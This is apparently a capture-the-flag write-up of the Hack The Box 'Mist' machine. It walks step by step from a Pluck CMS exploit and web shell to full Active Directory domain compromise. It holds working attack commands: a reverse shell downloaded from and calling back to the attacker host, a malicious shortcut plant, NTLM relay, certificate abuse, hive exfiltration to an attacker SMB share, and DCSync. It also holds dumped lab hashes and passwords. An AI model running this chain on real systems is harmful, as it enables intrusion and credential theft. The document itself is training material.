**Ping**
![[Pasted image 20240717105357.png]]

**Nmap Scans**
```
mapit 10.10.11.17
```

Nmap Default Scan
![[Pasted image 20240717105513.png]]

Nmap Script and Service Scan
![[Pasted image 20240717105524.png]]

Nmap All Port Scan
![[Pasted image 20240717121943.png]]

On Port  80 http://10.10.11.17
![[Pasted image 20240717122103.png]]

admin
![[Pasted image 20240717122254.png]]

Gobuster Scan
```
gobuster dir -u http://10.10.11.17 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobustet.txt
```
![[Pasted image 20240717123710.png]]

Will Explore data
```
gobuster dir -u http://10.10.11.17/data -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobustet_data.txt
```
![[Pasted image 20240717124243.png]]

On http://10.10.11.17/data/settings/
![[Pasted image 20240717124117.png]]
Will explore further

On http://10.10.11.17/data/settings/modules/albums/
![[Pasted image 20240717124150.png]]
Hmmmmm..... Intresting....! 

Have used the Pluck 4.7 directory traversal POC https://www.exploit-db.com/exploits/36986
![[Pasted image 20240717125434.png]]
Found some hash...! Will crack it

Cracked the hash using crackstaion
![[Pasted image 20240717125604.png]]
Found the password **lexypoo97** I think this will work for admin, will try

Worked...>!
![[Pasted image 20240717125818.png]]

No will use this file upload RCE exploit https://packetstormsecurity.com/files/162785/Pluck-CMS-4.7.13-Remote-Shell-Upload.html

Converted it into Zip file and uploaded in Manage Module -> Install Module
![[Pasted image 20240717132752.png]]

Shell.php https://github.com/flozz/p0wny-shell/blob/master/shell.php
![[Pasted image 20240717132830.png]]

Uploaded the shell.zip
![[Pasted image 20240717132819.png]]

can see this in http://10.10.11.17/data/modules/
![[Pasted image 20240717132925.png]]

Click the shell.php to get Web shell
![[Pasted image 20240717133003.png]]



Will Jump to Initial Foothold....!

Got it http://10.10.11.17/data/modules/shell/shell.php
![[Pasted image 20240717133119.png]]

Will get a reverse shell now
```
curl http://10.10.14.3/nc.exe -o nc.exe
./nc.exe -e cmd.exe 10.10.14.3 4444
```
![[Pasted image 20240717133831.png]]
Got a shell back...!

It is MS01
![[Pasted image 20240717155614.png]]

We can see Common Files directory
![[Pasted image 20240717134258.png]]

There are some .lnk file, will put a malicious one to get reverse shell
![[Pasted image 20240717134346.png]]

```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("c:\Common Applications\Notepad.lnk")
$lnk.TargetPath = "c:\xampp\htdocs\met.exe"
$lnk.Save()
```
![[Pasted image 20240718094102.png]]
![[Pasted image 20240718094126.png]]

Started multi Handler in msf and got shell as Brandon
![[Pasted image 20240718094243.png]]

BTW we have another gateway, so we need to pivot to access those
![[Pasted image 20240717135437.png]]

Will set up our guy Ligolo, For that I opened another shell for brandon and set up ligolo
![[Pasted image 20240717152520.png]]


Now Lest Invoke Sharphound
```
Invoke-BloodHound -CollectionMethod All
```
![[Pasted image 20240717154534.png]]

Transferred the zip file to my kali via smb
```
impacket-smbserver test . -smb2support -username username -password password
```
```
net use m: \\10.10.14.3\test /user:username password
```
![[Pasted image 20240717154634.png]]
![[Pasted image 20240717154619.png]]

Got it
![[Pasted image 20240717154814.png]]

Lets Invoke bloodhound now
![[Pasted image 20240717154856.png]]

![[Pasted image 20240717154921.png]]


Will generate a certificate using certipy.exe
```
Certify.exe  request /ca:DC01.mist.htb\mist-DC01-CA  /template:User
```
Now we will get cert.pem, will transfer that to our kali and generate cert.pfx using openssl
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Providerv1.0" -export -out cert.pfx
```
![[Pasted image 20240718100724.png]]

Will get Brandon hash
```
certipy auth -pfx cert.pfx -u Brandon.keywarp -domain mist.htb -dc-ip 192.168.100.100 -debug
```
![[Pasted image 20240718100748.png]]

It is valid Hash
![[Pasted image 20240718120100.png]]

Now will get MS01$ hash using this user NTLM Hash, First I Have started the responder and used Petitpotam.py https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py
```
python3 PetitPotam.py 10.10.14.3 192.168.100.101 -u 'brandon.keywarp' -hashes :db03d6a77a2205bc1d07082740626cc9 -d mist.htb -pipe all
```
![[Pasted image 20240718102237.png]]

Got NTLMV2
```
 MS01$::MIST:2e0481b2ce9991c1:28703D962F1DB67B416734F75242DC7D:01010000000000008040DDC0FAD8DA01811D648DD9EBFF5A00000000020008004F0052003400580001001E00570049004E002D00320050004F003800450033004600310049005000550004003400570049004E002D00320050004F00380045003300460031004900500055002E004F005200340058002E004C004F00430041004C00030014004F005200340058002E004C004F00430041004C00050014004F005200340058002E004C004F00430041004C00070008008040DDC0FAD8DA0106000400020000000800300030000000000000000000000000400000243649A2E5B8FB9613E19F9B9FB94071402FE70E4BF819E6417D7AF1BF8D3CA60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0033000000000000000000
```
![[Pasted image 20240718102316.png]]

Now we have to get MS01$ hash, Follow the Below steps
```
python3 ntlmrelayx.py -debug -t ldaps://192.168.100.100  -i -smb2support  -domain mist.htb  

python3 PetitPotam.py -u 'brandon.keywarp' -hashes :DB03D6A77A2205BC1D07082740626CC9 -pipe all MS01@4444/aaa 192.168.100.101

certipy cert -export -pfx dPNsqwfV.pfx  -password "nakTE7Vkff3NeLnl04AO" -out "unprotected.pfx"  \\change the .pfx and password accordingly
```

Will finally get MS01$ NTLM hash
```
[*] Got TGT  
[*] Saved credential cache to 'ms01.ccache'  
[*] Trying to retrieve NT hash for 'ms01$'  
[*] Got hash for 'ms01$@mist.htb': aad3b435b51404eeaad3b435b51404ee:4a74fc05400345d580cf58aec3e6d833
```

Using this we can Impersonate Admin of MS01$ and dump hashes in MS01 using Secrets Dump
```
.\Rubeus.exe asktgt /nowrap /user:"ms01$" /rc4:4a74fc05400345d580cf58aec3e6d833

.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /ticket:   \\Will get the ticket from Above command, use it here.

impacket-secretsdump administrator@ms01.mist.htb -k -no-pass -dc-ip 192.168.100.100
```
Finally We can dump Hashes from MS01$
```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f903787dd064cc1973c3aa4ca4a7c1:::  
svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::  
[*] Dumping cached domain logon information (domain/username:hash)  
MIST.HTB/Brandon.Keywarp:$DCC2$10240#Brandon.Keywarp#5f540c9ee8e4bfb80e3c732ff3e12b28: (2024-04-02 19:40:58)  
[*] Dumping LSA Secrets  
[*] $MACHINE.ACC   
MIST\MS01$:plain_password_hex:05026d28f0211624b80e3d04c599ea354667703a1ec85f78c0f38461197626bc4559dfd5185954984799ec09048e8e6a918c5fb423814d50fedc3c62631450d8439ba072994bf4aad5311fa4055f410e0ee6b5b849b33e62ff0f7af03b1a7787287bb6b5987096a3d3240b05f2241d6144900c0071b48419bde5cb38ab24e8977f64ceb09d0efeea7de1501c041504fb4742bd40403ae30589ca354c71684607c8a36f86a6f1df40abb3e45f4265fa1aef2339f85f40e32b74a3a1ec173c1dfce0528977aafeac71ba97e95826e3d31f0aeb3d67a04efcd4740cc38a94c64f585c5f0047c728f6061174f7d5e6215eb9  
MIST\MS01$:aad3b435b51404eeaad3b435b51404ee:4a74fc05400345d580cf58aec3e6d833:::  
[*] DPAPI_SYSTEM   
dpapi_machinekey:0xe464e18478cf4a7d809dfc9f5d6b5230ce98779b  
dpapi_userkey:0x579d7a06798911d322fedc960313e93a71b43cc2  
[*] NL$KM   
 0000   57 C8 F7 CD 24 F2 55 EB  19 1D 07 C2 15 84 21 B0   W...$.U.......!.  
 0010   90 7C 79 3C D5 BE CF AC  EF 40 4F 8E 2A 76 3F 00   .|y<.....@O.*v?.  
 0020   04 87 DF 47 CF D8 B7 AF  6D 5E EE 9F 16 5E 75 F3   ...G....m^...^u.  
 0030   80 24 AA 24 B0 7D 3C 29  4F EA 4E 4A FB 26 4E 62   .$.$.}<)O.NJ.&Nb  
NL$KM:57c8f7cd24f255eb191d07c2158421b0907c793cd5becfacef404f8e2a763f000487df47cfd8b7af6d5eee9f165e75f38024aa24b07d3c294fea4e4afb264e62  
[*] _SC_ApacheHTTPServer   
svc_web:MostSavagePasswordEver123
```
Got Admin's Hash 711e6a685af1c31c4029c3c7681dd97b

Will Use Evil Winrm to get a session admin
```
evil-winrm -i 192.168.100.101 -u 'Administrator' -H 711e6a685af1c31c4029c3c7681dd97b
```
![[Pasted image 20240718123650.png]]

Found Four Valuable things
```
Get-ChildItem -Path C:\Users -Include *.txt, *.log, *.kdbx, *.conf, *.ini, *.exe, *.ps1, *.png, *.jpg, *.jpeg -File -Recurse -ErrorAction SilentlyContinue
```
![[Pasted image 20240718125448.png]]

Got User.txt In admin's Desktop
![[Pasted image 20240718123923.png]]


Will Jump to Privilege Escalation....!

Transferred the .kdbx and.png files to my kali
```
download sharon.kdbx /root/HTB/windows/mist/sharon.kdbx
```
![[Pasted image 20240718124320.png]]
![[Pasted image 20240718130026.png]]

It is asking Password
```
 keepassxc sharon.kdbx
```
![[Pasted image 20240718124506.png]]

The Image already have half password UA7cpa[#1!_*ZX
![[Pasted image 20240718130233.png]]

Have to find other half, Can do it in two ways, using John and hashcat
Using John 
![[Pasted image 20240718132022.png]]

Using Hashcat
```
hashcat -a 3 -m 13400 --increment --increment-min 14 --increment-max 20 sharon.hash 'UA7cpa[#1ZX?a?a?a?a?a?a'
```

Password For Keepass file is UA7cpa[#1!_*ZX@ 
Found the password of Sharon in keepass file
![[Pasted image 20240718132151.png]]

So we have a password of sharon
![[Pasted image 20240718132826.png]]
Will Check the password is valid or not
![[Pasted image 20240718133034.png]]
Can get remote session to DC....!

Will use evil-winrm
```
evil-winrm -i 192.168.100.100 -u 'op_Sharon.Mullard' -p 'ImTiredOfThisJob:('
```
![[Pasted image 20240718133341.png]]

I can't add computer to the machine
![[Pasted image 20240718134127.png]]

So will find another way
![[Pasted image 20240718134223.png]]

Follow the steps below to achieve DCSync
```
curl 10.10.16.15:9999/Check-ADCSESC13.ps1 -o Check-ADCSESC13.ps1

. .\Check-ADCSESC13.ps1
```
```
python3 entry.py find -u "OP_SHARON.MULLARD" -p 'ImTiredOfThisJob:(' -dc-ip 192.168.100.100   \\run this in kali machine

```

In evil-winrm session
```
$gmsa = Get-ADServiceAccount -Identity 'svc_ca$' -Properties 'msDS-ManagedPassword'

$mp = $gmsa.'msDS-ManagedPassword'

ConvertFrom-ADManagedPasswordBlob $mp

wget 10.10.16.15:9999/GMSAPasswordReader.exe -o GMSAPasswordReader.exe

.\GMSAPasswordReader.exe --AccountName svc_ca$
```

Got it...!
```
Calculating hashes for Old Value  
[*] Input username             : svc_ca$  
[*] Input domain               : MIST.HTB  
[*] Salt                       : MIST.HTBsvc_ca$  
[*]       rc4_hmac             : 34956E4924985C2F1B7BA808CD54BCB8  
[*]       aes128_cts_hmac_sha1 : 7D70653181BBBDE2D77A658B4012C0F0  
[*]       aes256_cts_hmac_sha1 : CDB01B9AE39363E456618059222206A4609D896B4B2D76047A542109B4A34B4C  
[*]       des_cbc_md5          : 013BA2E6E9B51A1A  
  
Calculating hashes for Current Value  
[*] Input username             : svc_ca$  
[*] Input domain               : MIST.HTB  
[*] Salt                       : MIST.HTBsvc_ca$  
[*]       rc4_hmac             : 6DB5B4F0E49CF6DA4C937944D58C416B  
[*]       aes128_cts_hmac_sha1 : B3E8D1F1D7AC8F1D36B76FBF244F6E48  
[*]       aes256_cts_hmac_sha1 : B0611328BFB5D33DF8E8F3FEDCE1B271C7C36FE432445038EF06AFD4A7663504  
[*]       des_cbc_md5          : 013BA2E6E9B51A1A
```

Now we can Shadow creds
![[Pasted image 20240718134736.png]]

In kali
```
python pywhisker.py -d "mist.htb" --dc-ip 192.168.100.100 -u 'svc_ca$' -H "6DB5B4F0E49CF6DA4C937944D58C416B" --target "svc_cabackup" --action "add"

certipy cert -export -pfx 7430Jo4E.pfx -password "yi8I5FizP5gCNdawNrfF" -out "unprotected.pfx"   \\change .pfx and password accordingly
```

Got SVC_CABACKUP hash
```
[!] Could not find identification in the provided certificate  
[*] Using principal: svc_cabackup@mist.htb  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saved credential cache to 'svc_cabackup.ccache'  
[*] Trying to retrieve NT hash for 'svc_cabackup'  
[*] Got hash for 'svc_cabackup@mist.htb': aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64
```

In kali
```
certipy req -u "svc_cabackup@mist.htb" -hashes ":c9872f1bc10bdd522c12fc2ac9041b64" -template ManagerAuthentication -ca mist-DC01-CA -target dc01.mist.htb -key-size 4096 -dns-tcp -dc-ip 192.168.100.100 
```
Try again if it fails

```
certipy auth -pfx svc_cabackup.pfx

export KRB5CCNAME=svc_cabackup.ccache

certipy req -u "svc_cabackup@mist.htb" -k -template BackupSvcAuthentication -ca mist-DC01-CA -target dc01.mist.htb -key-size 4096 -dns-tcp -no-pass -dc-ip 192.168.100.100

impacket-smbserver kali . -smb2support -username root -password R0ot

impacket-reg 'mist.htb/svc_cabackup@dc01.mist.htb' -k -no-pass -dc-ip 192.168.100.100 save -keyName 'HKLM\SAM' -o '\\10.10.14.3\kali'

impacket-secretsdump -system SYSTEM.save -sam SAM.save local
```

Got Machine.ACC$ Hash **e768c4cf883a87ba9e96278990292260**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.  
[*] Dumping cached domain logon information (domain/username:hash)  
[*] Dumping LSA Secrets  
[*] $MACHINE.ACC   
$MACHINE.ACC:plain_password_hex:c68cb851aa6312ad86b532db8103025cb80e69025bd381860316ba55b056b9e1248e7817ab7fc5b23c232a5bd2aa5b8515041dc3dc47fa4e2d4c34c7db403c7edc4418cf22a1b8c2c544c464ec9fedefb1dcdbebff68c6e9a103f67f3032b68e7770b4e8e22ef05b29d002cc0e22ad4873a11ce9bac40785dcc566d38bb3e2f0d825d2f4011b566ccefdc55f098c3b76affb9a73c6212f69002655dd7b774673bf8eecaccd517e9550d88e33677ceba96f4bc273e4999bbd518673343c0a15804c43fde897c9bd579830258b630897e79d93d0c22edc2f933c7ec22c49514a2edabd5d546346ce55a0833fc2d8403780  
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260  
[*] DPAPI_SYSTEM   
dpapi_machinekey:0xc78bf46f3d899c3922815140240178912cb2eb59  
dpapi_userkey:0xc62a01b328674180712ffa554dd33d468d3ad7b8  
[*] NL$KM   
 0000   C4 C5 BF 4E A9 98 BD 1B  77 0E 76 A1 D3 09 4C AB   ...N....w.v...L.  
 0010   B6 95 C7 55 E8 5E 4C 48  55 90 C0 26 19 85 D4 C2   ...U.^LHU..&....  
 0020   67 D7 76 64 01 C8 61 B8  ED D6 D1 AF 17 5E 3D FC   g.vd..a......^=.  
 0030   13 E5 4D 46 07 5F 2B 67  D3 53 B7 6F E6 B6 27 31   ..MF._+g.S.o..'1  
NL$KM:c4c5bf4ea998bd1b770e76a1d3094cabb695c755e85e4c485590c0261985d4c267d7766401c861b8edd6d1af175e3dfc13e54d46075f2b67d353b76fe6b62731
```

In kali
```
cme smb 192.168.100.100 -u "DC01\$" -H "e768c4cf883a87ba9e96278990292260"

secretsdump.py -hashes ":e768c4cf883a87ba9e96278990292260"  DC01\$@192.168.100.100
```

Loooooted....>!
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::  
Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::  
Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::  
Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::  
Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::  
Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::  
Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::  
Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::  
op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::  
op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::  
svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::  
svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::  
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::  
MS01$:1108:aad3b435b51404eeaad3b435b51404ee:4a74fc05400345d580cf58aec3e6d833:::  
svc_ca$:1124:aad3b435b51404eeaad3b435b51404ee:6db5b4f0e49cf6da4c937944d58c416b:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:223c1b3a34e024798181df5812ff08617c8a874473002ca892f5f3312a0367d2  
Administrator:aes128-cts-hmac-sha1-96:98610a32239f909d2dd7191a0b200af3  
Administrator:des-cbc-md5:89e007fbc8197319  
krbtgt:aes256-cts-hmac-sha1-96:1f8d633a6aca948f3cfe1ae103ef2245825dc2f16ed171823ac817c097aea0f1  
krbtgt:aes128-cts-hmac-sha1-96:d746342824512200d29d504b040e150b  
krbtgt:des-cbc-md5:4923193b1c981332  
Sharon.Mullard:aes256-cts-hmac-sha1-96:46f1b3a696d5ce7194654e1ee205e05e5fc40fc6726232494d50172697404f59  
Sharon.Mullard:aes128-cts-hmac-sha1-96:ce1d4f67122df39096a0304087a37af9  
Sharon.Mullard:des-cbc-md5:1a7f4054163d7580  
Brandon.Keywarp:aes256-cts-hmac-sha1-96:5b6d15db9b7d5a87e6fab031a46dc560df979523edf72109a33dbee4c9023e2a  
Brandon.Keywarp:aes128-cts-hmac-sha1-96:c94f80b1f0f52971bc210cb7fa08e548  
Brandon.Keywarp:des-cbc-md5:80757608c7fef2ec  
Florence.Brown:aes256-cts-hmac-sha1-96:30edaa3ce504213f32a4ea4b4ee209788bc022d2702f45e512b8d552b530d9f3  
Florence.Brown:aes128-cts-hmac-sha1-96:68085dd2a95d4ead421af52312472061  
Florence.Brown:des-cbc-md5:ce7508bc0e7998ab  
Jonathan.Clinton:aes256-cts-hmac-sha1-96:ac2f7bfaee93c245ebbd9959fa420c32b1d69780560c8a23c605eb47e5d6cc46  
Jonathan.Clinton:aes128-cts-hmac-sha1-96:467238a4a231a28930e412d27ed8b09a  
Jonathan.Clinton:des-cbc-md5:087c674fcdf1bf8f  
Markus.Roheb:aes256-cts-hmac-sha1-96:48553e83896443f93aa77b0f280407f02d0a13da45c2c39598fb0fa298c17043  
Markus.Roheb:aes128-cts-hmac-sha1-96:e48c992fe7678056ac85e0fe169c02c5  
Markus.Roheb:des-cbc-md5:7940c4c8259b1af7  
Shivangi.Sumpta:aes256-cts-hmac-sha1-96:4b6f0e6c634bdc4dad3b91b42fec80135c5520f49aa7f7d541d27aacfce21d89  
Shivangi.Sumpta:aes128-cts-hmac-sha1-96:25fba62098625aecfe9f335aa71a01cb  
Shivangi.Sumpta:des-cbc-md5:c24fa21ccb91aba1  
Harry.Beaucorn:aes256-cts-hmac-sha1-96:f85edbb56f68155fb8b45360ba2e67cbe67893c8875d7ae1ea2a54085f082a73  
Harry.Beaucorn:aes128-cts-hmac-sha1-96:e21bf6bd700e77fdea81121431629f4c  
Harry.Beaucorn:des-cbc-md5:ab7c137ad364e66e  
op_Sharon.Mullard:aes256-cts-hmac-sha1-96:14457283d779320d1bf9e003ee084c9f70d8fec7324345ac15d16241c512299f  
op_Sharon.Mullard:aes128-cts-hmac-sha1-96:c439ce69fb34c7b2c693cd11dabd2488  
op_Sharon.Mullard:des-cbc-md5:8cc158f8527585ba  
op_Markus.Roheb:aes256-cts-hmac-sha1-96:630b8034289cce271b529607039bff05635578b555f055e15398e90665a3a91b  
op_Markus.Roheb:aes128-cts-hmac-sha1-96:48f2924abb1cdbe2b029a679b9f95e2c  
op_Markus.Roheb:des-cbc-md5:3876f7baa1e97932  
svc_smb:aes256-cts-hmac-sha1-96:ab6fd9c7fb1497cd70e54fbe3e763cfac26fa660ceee14492736c6c183b74e37  
svc_smb:aes128-cts-hmac-sha1-96:a8626be32fc03eff20e28b11101cd262  
svc_smb:des-cbc-md5:b0f8bfb5e6ea0431  
svc_cabackup:aes256-cts-hmac-sha1-96:7bb6d62ae4d9438ed967ac87ebe16c00ed8eec1d2ef6979288ad16a0ef9d1dd4  
svc_cabackup:aes128-cts-hmac-sha1-96:f85ae26f1f4f33686293221872fef92a  
svc_cabackup:des-cbc-md5:4a7504e5341910df  
DC01$:aes256-cts-hmac-sha1-96:a47600b1ff206958b49938fdff101d4444253de01f595c7fe1a5276e4265c245  
DC01$:aes128-cts-hmac-sha1-96:7043bf9b8bf4e5886058da7defab4581  
DC01$:des-cbc-md5:07fef70d97161502  
MS01$:aes256-cts-hmac-sha1-96:eb63394ce682b22c0fb3c276311849451342610599591754beef8d3cf27e2214  
MS01$:aes128-cts-hmac-sha1-96:f9d24f9b45194a614ce418e98982f25a  
MS01$:des-cbc-md5:bacb4cae588a01da  
svc_ca$:aes256-cts-hmac-sha1-96:ea5f16e62631c478173135932531e38c582032e6e75e40a196946faa2672fb2a  
svc_ca$:aes128-cts-hmac-sha1-96:485a2326700449853eb4bb38e2f61d3c  
svc_ca$:des-cbc-md5:b3439497cef2f82c  
[*] Cleaning up...
```

DC01 Admin's Hash **b46782b9365344abdff1a925601e0385**

Will get a Session as Domain Controller in DC01
```
evil-winrm -u administrator -H 'b46782b9365344abdff1a925601e0385' -i 192.168.100.100
```
![[Pasted image 20240718141754.png]]

Root.txt
![[Pasted image 20240718141738.png]]


Done with Mist.....:)